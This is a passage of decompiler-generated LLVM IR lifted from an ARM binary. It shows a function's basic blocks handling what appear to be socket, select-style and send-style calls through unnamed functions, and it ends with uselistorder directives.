  %v1_11628 = add i32 %v0_11624, 4
  %v2_11628 = inttoptr i32 %v1_11628 to i32*
  %v3_11628 = load i32, i32* %v2_11628, align 4
  store i32 %v3_11628, i32* @r0, align 4
  %v1_1162c = add i32 %v2_11624, 13
  %v2_1162c = inttoptr i32 %v1_1162c to i8*
  %v3_1162c = load i8, i8* %v2_1162c, align 1
  %v4_1162c = zext i8 %v3_1162c to i32
  store i32 %v4_1162c, i32* @r2, align 4
  %v1_11630 = add i32 %v2_11624, 4
  %v2_11630 = inttoptr i32 %v1_11630 to i32*
  %v3_11630 = load i32, i32* %v2_11630, align 4
  store i32 %v3_11630, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11638 = call i32 @function_14ac0(i32 %v3_11628, i32 %v3_11630, i32 %v4_1162c, i32 16384)
  store i32 %v4_11638, i32* %r0.global-to-local, align 4
  %v0_1163c = load i32, i32* @r6, align 4
  %v1_1163c = add i32 %v0_1163c, 4
  %v2_1163c = inttoptr i32 %v1_1163c to i32*
  %v3_1163c = load i32, i32* %v2_1163c, align 4
  store i32 %v3_1163c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1164c = call i32 @function_14ac0(i32 %v3_1163c, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_11654 = load i32, i32* @r6, align 4
  %v2_11654 = add i32 %v1_11654, 12
  %v3_11654 = inttoptr i32 %v2_11654 to i32*
  store i32 5, i32* %v3_11654, align 4
  br label %dec_label_pc_11400

dec_label_pc_1165c:                               ; preds = %dec_label_pc_10d94
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11668 = call i32 @function_11ad8(i32 25)
  store i32 %v2_11318, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_11678 = call i32 @function_11a14(i32 25, i32* nonnull %stack_var_-60)
  store i32 %v3_11678, i32* %r0.global-to-local, align 4
  %v3_1167c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11678, i32* %r2.global-to-local, align 4
  %v1_11684 = add i32 %v3_1167c, -1
  store i32 %v1_11684, i32* %r3.global-to-local, align 4
  %v0_11688 = load i32, i32* @r6, align 4
  %v1_11688 = add i32 %v0_11688, 24
  %v2_11688 = inttoptr i32 %v1_11688 to i32*
  %v3_11688 = load i32, i32* %v2_11688, align 4
  store i32 %v3_11688, i32* %r1.global-to-local, align 4
  %v0_1168c = load i32, i32* @fp, align 4
  store i32 %v0_1168c, i32* %r0.global-to-local, align 4
  %v4_11690 = call i32 @function_12428(i32 %v0_1168c, i32 %v3_11688, i32 %v3_11678, i32 %v1_11684)
  store i32 %v4_11690, i32* @r7, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_1169c = call i32 @function_11a38(i32 25)
  store i32 %v1_1169c, i32* %r0.global-to-local, align 4
  %v0_116a0 = load i32, i32* @r7, align 4
  %v2_116a0 = icmp eq i32 %v0_116a0, -1
  store i1 %v2_116a0, i1* %cpsr_c.global-to-local, align 1
  %v7_116a0 = icmp eq i32 %v0_116a0, -1
  store i1 %v7_116a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_116a0, label %dec_label_pc_10c58.loopexit, label %dec_label_pc_116a8

dec_label_pc_116a8:                               ; preds = %dec_label_pc_1165c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116a8 = icmp eq i32 %v0_116a0, 0
  store i1 %v2_116a8, i1* %cpsr_z.global-to-local, align 1
  %tmp376 = icmp slt i32 %v0_116a0, 1
  br i1 %tmp376, label %dec_label_pc_11400, label %dec_label_pc_116b0

dec_label_pc_116b0:                               ; preds = %dec_label_pc_116a8
  %v0_116b0 = load i32, i32* @r6, align 4
  %v1_116b0 = add i32 %v0_116b0, 20
  %v2_116b0 = inttoptr i32 %v1_116b0 to i16*
  %v3_116b0 = load i16, i16* %v2_116b0, align 2
  %v4_116b0 = zext i16 %v3_116b0 to i32
  store i32 %v4_116b0, i32* %r3.global-to-local, align 4
  %v1_116b4 = add i32 %v0_116b0, 16
  %v2_116b4 = inttoptr i32 %v1_116b4 to i32*
  %v3_116b4 = load i32, i32* %v2_116b4, align 4
  store i32 %v3_116b4, i32* %r2.global-to-local, align 4
  store i32 %v2_116b8, i32* %ip.global-to-local, align 4
  store i32 %v4_116b0, i32* %stack_var_-42, align 4
  store i32 %v3_116b4, i32* %stack_var_-60, align 4
  %v1_116c4 = inttoptr i32 %v0_116b0 to i32*
  %v2_116c4 = load i32, i32* %v1_116c4, align 4
  store i32 %v2_116c4, i32* @sb, align 4
  %v0_116c8 = call i32 @function_14c98()
  store i32 %v0_116c8, i32* %r0.global-to-local, align 4
  %v7_116cc = icmp eq i32 %v0_116c8, -1
  %.387 = zext i1 %v7_116cc to i32
  store i32 %.387, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116d8 = icmp eq i32 %v0_116c8, 0
  store i1 %v2_116d8, i1* %cpsr_z.global-to-local, align 1
  %tmp379 = icmp slt i32 %v0_116c8, 1
  br i1 %tmp379, label %bb380, label %.thread103

.thread103:                                       ; preds = %dec_label_pc_116b0
  store i32 1, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11730

bb380:                                            ; preds = %dec_label_pc_116b0
  store i32 %.387, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116e4 = icmp eq i1 %v7_116cc, false
  store i1 %v2_116e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116e4, label %dec_label_pc_116ec, label %dec_label_pc_11730

dec_label_pc_116ec:                               ; preds = %bb380
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_116f8 = call i32 @function_14ba0(i32 2, i32 1, i32 0)
  store i32 %v3_116f8, i32* %r0.global-to-local, align 4
  %v2_116fc = icmp eq i32 %v3_116f8, -1
  store i1 %v2_116fc, i1* %cpsr_c.global-to-local, align 1
  %v7_116fc = icmp eq i32 %v3_116f8, -1
  store i1 %v7_116fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_116f8, i32* @r8, align 4
  br i1 %v7_116fc, label %dec_label_pc_119b8, label %dec_label_pc_11708

dec_label_pc_11708:                               ; preds = %dec_label_pc_116ec
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_1170c = call i32 @function_11ad8(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_11714 = call i32 @function_11ad8(i32 19)
  %v0_11718 = load i32, i32* @sl, align 4
  store i32 %v0_11718, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r0.global-to-local, align 4
  %v2_11720 = inttoptr i32 %v0_11718 to i32*
  %v3_11720 = call i32 @function_11a14(i32 18, i32* %v2_11720)
  store i32 %v3_11720, i32* %r0.global-to-local, align 4
  %v1_11724 = call i32 @function_f874(i32 %v3_11720)
  store i32 %v1_11724, i32* %r0.global-to-local, align 4
  store i32 %v1_11724, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_11728 = icmp eq i32 %v1_11724, 0
  store i1 %v3_11728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11728, label %dec_label_pc_11730, label %dec_label_pc_11898

dec_label_pc_11730:                               ; preds = %.thread103, %dec_label_pc_11708, %bb380
  %v0_11730 = load i32, i32* @r6, align 4
  %v1_11730 = add i32 %v0_11730, 4
  %v2_11730 = inttoptr i32 %v1_11730 to i32*
  %v3_11730 = load i32, i32* %v2_11730, align 4
  store i32 %v3_11730, i32* @r0, align 4
  %v1_11734 = call i32 @function_15b6c(i32 %v3_11730)
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_11740 = load i32, i32* @r6, align 4
  %v2_11740 = add i32 %v1_11740, 4
  %v3_11740 = inttoptr i32 %v2_11740 to i32*
  store i32 -1, i32* %v3_11740, align 4
  %v0_11744 = load i32, i32* %r0.global-to-local, align 4
  %v1_11744 = load i32, i32* @r6, align 4
  %v2_11744 = add i32 %v1_11744, 12
  %v3_11744 = inttoptr i32 %v2_11744 to i32*
  store i32 %v0_11744, i32* %v3_11744, align 4
  br label %dec_label_pc_11400

dec_label_pc_1174c:                               ; preds = %dec_label_pc_10c74
  br i1 %v2_10c9c, label %dec_label_pc_10d14, label %dec_label_pc_11750

dec_label_pc_11750:                               ; preds = %dec_label_pc_1174c
  %v3_11750 = icmp eq i32 %v4_10c98, -1
  store i1 %v3_11750, i1* %cpsr_c.global-to-local, align 1
  %v8_11750 = icmp eq i32 %v4_10c98, -1
  store i1 %v8_11750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11750, label %dec_label_pc_10d20, label %dec_label_pc_10cc4

dec_label_pc_1175c:                               ; preds = %dec_label_pc_10c64
  store i32 %.pre, i32* %r0.global-to-local, align 4
  %v1_11764 = add i32 %v0_1175c, 92
  store i32 %v1_11764, i32* %r1.global-to-local, align 4
  store i32 192, i32* %r2.global-to-local, align 4
  %v3_1176c = inttoptr i32 %.pre to i8*
  %v4_1176c = call i32 @function_15448(i8* %v3_1176c, i32 %v1_11764, i32 192)
  store i32 %v4_1176c, i32* %r0.global-to-local, align 4
  %v0_11770 = load i32, i32* @r6, align 4
  %v1_11770 = add i32 %v0_11770, 24
  %v2_11770 = inttoptr i32 %v1_11770 to i32*
  %v3_11770 = load i32, i32* %v2_11770, align 4
  %v1_11774 = add i32 %v3_11770, -64
  store i32 %v1_11774, i32* %r3.global-to-local, align 4
  store i32 %v1_11774, i32* %v2_11770, align 4
  br label %dec_label_pc_10c74

dec_label_pc_11780:                               ; preds = %dec_label_pc_115b4
  store i32 %v2_11574, i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_1178c = add i32 %v0_115a0, 4
  %v2_1178c = inttoptr i32 %v1_1178c to i32*
  %v3_1178c = load i32, i32* %v2_1178c, align 4
  store i32 %v3_1178c, i32* @r0, align 4
  %v4_11790 = call i32 @function_14ac0(i32 %v3_1178c, i32 %v2_11574, i32 3, i32 16384)
  store i32 %v4_11790, i32* %r0.global-to-local, align 4
  %v0_11794 = load i32, i32* @r6, align 4
  %v1_11794 = add i32 %v0_11794, 4
  %v2_11794 = inttoptr i32 %v1_11794 to i32*
  %v3_11794 = load i32, i32* %v2_11794, align 4
  store i32 %v3_11794, i32* @r0, align 4
  br label %dec_label_pc_11544

dec_label_pc_117a4:                               ; preds = %dec_label_pc_10dcc
  %v0_117a4 = load i32, i32* @r6, align 4
  store i32 %v0_117a4, i32* @r0, align 4
  %v0_117a8 = call i32 @function_fdc0()
  store i32 %v0_117a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e08

dec_label_pc_117b0:                               ; preds = %dec_label_pc_10c1c
  store i32 4, i32* @r2, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_11920, i32* %r3.global-to-local, align 4
  store i32 %v2_11318, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_117d8 = call i32 @function_14850(i32 %v3_10c10, i32 1, i32 4, i32 %v2_11920, i32 %v2_11318)
  %v3_117dc = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_117dc, i32* %r3.global-to-local, align 4
  %v2_117e0 = or i32 %v3_117dc, %v5_117d8
  store i32 %v2_117e0, i32* %r0.global-to-local, align 4
  %v4_117e0 = icmp eq i32 %v2_117e0, 0
  store i1 %v4_117e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_117e0, label %dec_label_pc_117e8, label %dec_label_pc_1187c

dec_label_pc_117e8:                               ; preds = %dec_label_pc_117b0
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_117ec = load i32, i32* @r6, align 4
  %v2_117ec = add i32 %v1_117ec, 12
  %v3_117ec = inttoptr i32 %v2_117ec to i32*
  store i32 2, i32* %v3_117ec, align 4
  %v0_117f0 = call i32 @function_f570()
  store i32 %v0_117f0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_223e4.200 to i32), i32* %r3.global-to-local, align 4
  %v2_117f8 = load i16, i16* bitcast (i16** @global_var_223e4.200 to i16*), align 4
  %v3_117f8 = zext i16 %v2_117f8 to i32
  store i32 %v3_117f8, i32* %r1.global-to-local, align 4
  %v3_117fc = call i32 @function_12a68(i32 %v0_117f0, i32 %v3_117f8)
  store i32 %v3_117fc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223b4.196 to i32), i32* %r3.global-to-local, align 4
  %v2_11804 = load i32, i32* @global_var_223b4.196, align 4
  store i32 %v2_11804, i32* %ip.global-to-local, align 4
  %v1_1180c = load i32, i32* @r4, align 4
  %v9_1180c = icmp eq i32 %v2_11804, %v1_1180c
  store i1 %v9_1180c, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_117f8, i32* %r1.global-to-local, align 4
  %v7_11814 = icmp sgt i32 %v2_11804, %v1_1180c
  br i1 %v7_11814, label %dec_label_pc_11818, label %dec_label_pc_11858

dec_label_pc_11818:                               ; preds = %dec_label_pc_117e8
  %v2_1181c = load i32, i32* @global_var_223e0.198, align 4
  store i32 %v2_1181c, i32* %r3.global-to-local, align 4
  store i32 %v1_1180c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11838

dec_label_pc_11828:                               ; preds = %dec_label_pc_11848, %dec_label_pc_11838
  %v1_11828 = add i32 %v0_11828, 1
  store i32 %v1_11828, i32* %r2.global-to-local, align 4
  %v9_1182c = icmp eq i32 %v1_11828, %v2_11804
  %v1_11830 = add i32 %v0_11830, 16
  store i32 %v1_11830, i32* %r3.global-to-local, align 4
  br i1 %v9_1182c, label %dec_label_pc_11858.loopexit, label %dec_label_pc_11838

dec_label_pc_11838:                               ; preds = %dec_label_pc_11828, %dec_label_pc_11818
  %v0_11828 = phi i32 [ %v1_11828, %dec_label_pc_11828 ], [ %v1_1180c, %dec_label_pc_11818 ]
  %v0_11830 = phi i32 [ %v1_11830, %dec_label_pc_11828 ], [ %v2_1181c, %dec_label_pc_11818 ]
  store i32 %v0_11830, i32* %r0.global-to-local, align 4
  %v1_1183c = add i32 %v0_11830, 8
  %v2_1183c = inttoptr i32 %v1_1183c to i16*
  %v3_1183c = load i16, i16* %v2_1183c, align 2
  %v4_1183c = zext i16 %v3_1183c to i32
  store i32 %v4_1183c, i32* %r3.global-to-local, align 4
  %tmp381 = icmp ugt i16 %v3_1183c, %v2_117f8
  br i1 %tmp381, label %dec_label_pc_11828, label %dec_label_pc_11848

dec_label_pc_11848:                               ; preds = %dec_label_pc_11838
  %v1_11848 = add i32 %v0_11830, 10
  %v2_11848 = inttoptr i32 %v1_11848 to i16*
  %v3_11848 = load i16, i16* %v2_11848, align 2
  %v4_11848 = zext i16 %v3_11848 to i32
  store i32 %v4_11848, i32* %r3.global-to-local, align 4
  %v3_1184c = icmp uge i16 %v3_11848, %v2_117f8
  %v9_1184c = icmp eq i16 %v3_11848, %v2_117f8
  %v2_11850 = xor i1 %v3_1184c, true
  %v3_11850 = or i1 %v9_1184c, %v2_11850
  br i1 %v3_11850, label %dec_label_pc_11828, label %dec_label_pc_1185c.loopexit

dec_label_pc_11858.loopexit:                      ; preds = %dec_label_pc_11828
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11858

dec_label_pc_11858:                               ; preds = %dec_label_pc_11858.loopexit, %dec_label_pc_117e8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1185c

dec_label_pc_1185c.loopexit:                      ; preds = %dec_label_pc_11848
  store i1 %v3_1184c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1185c

dec_label_pc_1185c:                               ; preds = %dec_label_pc_1185c.loopexit, %dec_label_pc_11858
  %v0_11870 = phi i32 [ %v0_11830, %dec_label_pc_1185c.loopexit ], [ 0, %dec_label_pc_11858 ]
  %v0_1185c = load i32, i32* @r6, align 4
  %v1_1185c = add i32 %v0_1185c, 4
  %v2_1185c = inttoptr i32 %v1_1185c to i32*
  %v3_1185c = load i32, i32* %v2_1185c, align 4
  %v3_11860 = udiv i32 %v3_1185c, 32
  store i32 %v3_11860, i32* %r2.global-to-local, align 4
  %v1_11864 = urem i32 %v3_1185c, 32
  store i32 %v1_11864, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_11868 = mul nuw nsw i32 %v3_11860, 4
  store i32 %v3_11868, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11870 = inttoptr i32 %v0_1185c to i32*
  store i32 %v0_11870, i32* %v2_11870, align 4
  %v0_11874 = load i32, i32* %r3.global-to-local, align 4
  %v1_11874 = load i32, i32* @r6, align 4
  %v2_11874 = add i32 %v1_11874, 24
  %v3_11874 = inttoptr i32 %v2_11874 to i32*
  store i32 %v0_11874, i32* %v3_11874, align 4
  %v0_10c44.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_10c4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10c40

dec_label_pc_1187c:                               ; preds = %dec_label_pc_117b0
  %v0_1187c = load i32, i32* @r6, align 4
  %v1_1187c = add i32 %v0_1187c, 4
  %v2_1187c = inttoptr i32 %v1_1187c to i32*
  %v3_1187c = load i32, i32* %v2_1187c, align 4
  store i32 %v3_1187c, i32* @r0, align 4
  %v1_11880 = call i32 @function_15b6c(i32 %v3_1187c)
  store i32 %v1_11880, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_11888 = load i32, i32* @r4, align 4
  %v1_11888 = load i32, i32* @r6, align 4
  %v2_11888 = add i32 %v1_11888, 12
  %v3_11888 = inttoptr i32 %v2_11888 to i32*
  store i32 %v0_11888, i32* %v3_11888, align 4
  %v0_1188c = load i32, i32* %r3.global-to-local, align 4
  %v1_1188c = load i32, i32* @r6, align 4
  %v2_1188c = add i32 %v1_1188c, 4
  %v3_1188c = inttoptr i32 %v2_1188c to i32*
  store i32 %v0_1188c, i32* %v3_1188c, align 4
  %v0_11890 = load i32, i32* @r4, align 4
  %v1_11890 = trunc i32 %v0_11890 to i8
  %v2_11890 = load i32, i32* @r6, align 4
  %v3_11890 = add i32 %v2_11890, 284
  %v4_11890 = inttoptr i32 %v3_11890 to i8*
  store i8 %v1_11890, i8* %v4_11890, align 1
  br label %dec_label_pc_10d7c

dec_label_pc_11898:                               ; preds = %dec_label_pc_11708
  store i32 %v2_116b8, i32* @lr, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_118a4 = add i32 %v1_11724, 4
  %v2_118a4 = inttoptr i32 %v1_118a4 to i32*
  %v3_118a4 = load i32, i32* %v2_118a4, align 4
  store i32 %v3_118a4, i32* @r4, align 4
  %v0_118a8 = call i32 @function_f570()
  store i32 %v0_118a8, i32* %r0.global-to-local, align 4
  %v0_118ac = load i32, i32* @r5, align 4
  %v1_118ac = inttoptr i32 %v0_118ac to i8*
  %v2_118ac = load i8, i8* %v1_118ac, align 1
  %v3_118ac = zext i8 %v2_118ac to i32
  store i32 %v3_118ac, i32* %r1.global-to-local, align 4
  %v2_118b0 = call i32 @function_12a68(i32 %v0_118a8, i32 %v3_118ac)
  store i32 %v2_118b0, i32* %r0.global-to-local, align 4
  %v0_118b4 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_118b4 = mul nuw nsw i32 %v3_118ac, 4
  %v5_118b4 = add i32 %v0_118b4, %v4_118b4
  %v6_118b4 = inttoptr i32 %v5_118b4 to i32*
  %v7_118b4 = load i32, i32* %v6_118b4, align 4
  store i32 %v7_118b4, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v0_118bc = load i32, i32* @sl, align 4
  store i32 %v0_118bc, i32* %r1.global-to-local, align 4
  %v2_118c4 = inttoptr i32 %v0_118bc to i32*
  %v3_118c4 = call i32 @function_11a14(i32 19, i32* %v2_118c4)
  store i32 %v2_116b8, i32* %r1.global-to-local, align 4
  %v0_118d4 = load i32, i32* @r5, align 4
  store i32 %v0_118d4, i32* %r0.global-to-local, align 4
  %v1_118d8 = call i32 @function_f84c(i32 %v0_118d4)
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_118e0 = call i32 @function_11a38(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_118e8 = call i32 @function_11a38(i32 19)
  %v0_118f0 = load i32, i32* @r8, align 4
  store i32 %v0_118f0, i32* %r0.global-to-local, align 4
  store i32 %v2_118f4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_118fc = call i32 @function_147e4(i32 %v0_118f0, i32 %v2_118f4, i32 16)
  store i32 %v3_118fc, i32* %r0.global-to-local, align 4
  %v3_11900 = icmp eq i32 %v3_118fc, -1
  store i1 %v3_11900, i1* %cpsr_c.global-to-local, align 1
  %v8_11900 = icmp eq i32 %v3_118fc, -1
  store i1 %v8_11900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11900, label %dec_label_pc_11908, label %dec_label_pc_11918

dec_label_pc_11908:                               ; preds = %dec_label_pc_11898
  %v0_11908 = load i32, i32* @r8, align 4
  store i32 %v0_11908, i32* @r0, align 4
  %v1_1190c = call i32 @function_15b6c(i32 %v0_11908)
  %v0_11910 = load i32, i32* @sl, align 4
  store i32 %v0_11910, i32* %r0.global-to-local, align 4
  %v1_11914 = call i32 @function_12f30(i32 %v0_11910)
  store i32 %v1_11914, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11918

dec_label_pc_11918:                               ; preds = %dec_label_pc_11898, %dec_label_pc_11908
  store i32 1, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_11920, i32* @r1, align 4
  %v0_11924 = load i32, i32* @r8, align 4
  store i32 %v0_11924, i32* @r0, align 4
  %v0_11928 = load i32, i32* @sl, align 4
  store i32 %v0_11928, i32* %stack_var_-56, align 4
  %v5_1192c = call i32 @function_14ac0(i32 %v0_11924, i32 %v2_11920, i32 1, i32 16384)
  store i32 %v2_11318, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11940 = load i32, i32* @r8, align 4
  store i32 %v0_11940, i32* @r0, align 4
  %v4_11944 = call i32 @function_14ac0(i32 %v0_11940, i32 %v2_11318, i32 4, i32 16384)
  store i32 %v2_1194c, i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11958 = load i32, i32* @r8, align 4
  store i32 %v0_11958, i32* @r0, align 4
  %v4_1195c = call i32 @function_14ac0(i32 %v0_11958, i32 %v2_1194c, i32 2, i32 16384)
  %v0_11960 = load i32, i32* @sb, align 4
  %v1_11960 = add i32 %v0_11960, 12
  store i32 %v1_11960, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1196c = load i32, i32* @r8, align 4
  store i32 %v0_1196c, i32* @r0, align 4
  %v4_11970 = call i32 @function_14ac0(i32 %v0_1196c, i32 %v1_11960, i32 1, i32 16384)
  store i32 %v4_11970, i32* %r0.global-to-local, align 4
  %v0_11974 = load i32, i32* @sb, align 4
  %v1_11974 = inttoptr i32 %v0_11974 to i32*
  %v2_11974 = load i32, i32* %v1_11974, align 4
  store i32 %v2_11974, i32* @r1, align 4
  %v1_11978 = add i32 %v0_11974, 12
  %v2_11978 = inttoptr i32 %v1_11978 to i8*
  %v3_11978 = load i8, i8* %v2_11978, align 1
  %v4_11978 = zext i8 %v3_11978 to i32
  store i32 %v4_11978, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11980 = load i32, i32* @r8, align 4
  store i32 %v0_11980, i32* @r0, align 4
  %v4_11984 = call i32 @function_14ac0(i32 %v0_11980, i32 %v2_11974, i32 %v4_11978, i32 16384)
  %v0_11988 = load i32, i32* @sb, align 4
  %v1_11988 = add i32 %v0_11988, 13
  store i32 %v1_11988, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11994 = load i32, i32* @r8, align 4
  store i32 %v0_11994, i32* @r0, align 4
  %v4_11998 = call i32 @function_14ac0(i32 %v0_11994, i32 %v1_11988, i32 1, i32 16384)
  %v0_1199c = load i32, i32* @r8, align 4
  store i32 %v0_1199c, i32* @r0, align 4
  %v0_119a0 = load i32, i32* @sb, align 4
  %v1_119a0 = add i32 %v0_119a0, 13
  %v2_119a0 = inttoptr i32 %v1_119a0 to i8*
  %v3_119a0 = load i8, i8* %v2_119a0, align 1
  %v4_119a0 = zext i8 %v3_119a0 to i32
  store i32 %v4_119a0, i32* @r2, align 4
  %v1_119a4 = add i32 %v0_119a0, 4
  %v2_119a4 = inttoptr i32 %v1_119a4 to i32*
  %v3_119a4 = load i32, i32* %v2_119a4, align 4
  store i32 %v3_119a4, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_119ac = call i32 @function_14ac0(i32 %v0_1199c, i32 %v3_119a4, i32 %v4_119a0, i32 16384)
  %v0_119b0 = load i32, i32* @r8, align 4
  store i32 %v0_119b0, i32* @r0, align 4
  %v1_119b4 = call i32 @function_15b6c(i32 %v0_119b0)
  store i32 %v1_119b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_119b8

dec_label_pc_119b8:                               ; preds = %dec_label_pc_116ec, %dec_label_pc_11918
  %v0_119b8 = load i32, i32* @sl, align 4
  store i32 %v0_119b8, i32* %r0.global-to-local, align 4
  %v1_119bc = call i32 @function_12f30(i32 %v0_119b8)
  store i32 %v1_119bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_119c0

dec_label_pc_119c0:                               ; preds = %dec_label_pc_113dc, %dec_label_pc_119b8
  %v0_119c0 = load i32, i32* @fp, align 4
  store i32 %v0_119c0, i32* %r0.global-to-local, align 4
  %v0_119c4 = load i32, i32* @r6, align 4
  %v1_119c4 = add i32 %v0_119c4, 24
  %v2_119c4 = inttoptr i32 %v1_119c4 to i32*
  %v3_119c4 = load i32, i32* %v2_119c4, align 4
  store i32 %v3_119c4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19a54.339 to i32), i32* %r2.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v5_119d0 = call i32 @function_12428(i32 %v0_119c0, i32 %v3_119c4, i32 ptrtoint ([6 x i8]* @global_var_19a54.339 to i32), i32 5)
  store i32 %v5_119d0, i32* %r0.global-to-local, align 4
  %v3_119d4 = icmp eq i32 %v5_119d0, -1
  store i1 %v3_119d4, i1* %cpsr_c.global-to-local, align 1
  %v8_119d4 = icmp eq i32 %v5_119d0, -1
  store i1 %v8_119d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_119d0, i32* @r7, align 4
  br i1 %v3_119d4, label %dec_label_pc_10c58.loopexit, label %dec_label_pc_113f8

dec_label_pc_119e4:                               ; preds = %dec_label_pc_10aa0
  store i32 %v3_119e4, i32* %r0.global-to-local, align 4
  %v3_119e8 = udiv i32 %v3_119e4, 32
  %v3_119ec = mul nuw nsw i32 %v3_119e8, 4
  store i32 %v2_119f0, i32* @lr, align 4
  %v2_119f4 = add i32 %v3_119ec, %v2_119f0
  store i32 %v2_119f4, i32* %r3.global-to-local, align 4
  %v1_119f8 = add i32 %v2_119f4, -312
  %v2_119f8 = inttoptr i32 %v1_119f8 to i32*
  %v3_119f8 = load i32, i32* %v2_119f8, align 4
  %v1_119fc = urem i32 %v3_119e4, 32
  store i32 %v1_119fc, i32* %r1.global-to-local, align 4
  %v7_11a00 = shl i32 1, %v1_119fc
  %v8_11a00 = or i32 %v3_119f8, %v7_11a00
  store i32 %v8_11a00, i32* %r2.global-to-local, align 4
  %v1_11a04 = load i32, i32* @r5, align 4
  %v3_11a04 = icmp uge i32 %v3_119e4, %v1_11a04
  store i1 %v3_11a04, i1* %cpsr_c.global-to-local, align 1
  %v9_11a04 = icmp eq i32 %v3_119e4, %v1_11a04
  store i1 %v9_11a04, i1* %cpsr_z.global-to-local, align 1
  %v7_11a08 = icmp sgt i32 %v3_119e4, %v1_11a04
  br i1 %v7_11a08, label %bb382, label %bb383

bb382:                                            ; preds = %dec_label_pc_119e4
  store i32 %v3_119e4, i32* @r5, align 4
  br label %bb383

bb383:                                            ; preds = %dec_label_pc_119e4, %bb382
  store i32 %v8_11a00, i32* %v2_119f8, align 4
  br label %bb334

; uselistorder directives
  uselistorder i32 %v1_11a04, { 0, 2, 1 }
  uselistorder i32 %v1_119fc, { 1, 0 }
  uselistorder i32 %v5_119d0, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_1185c, { 1, 0 }
  uselistorder i1 %v3_1184c, { 1, 0 }
  uselistorder i32 %v0_11830, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_11804, { 0, 2, 1, 3 }
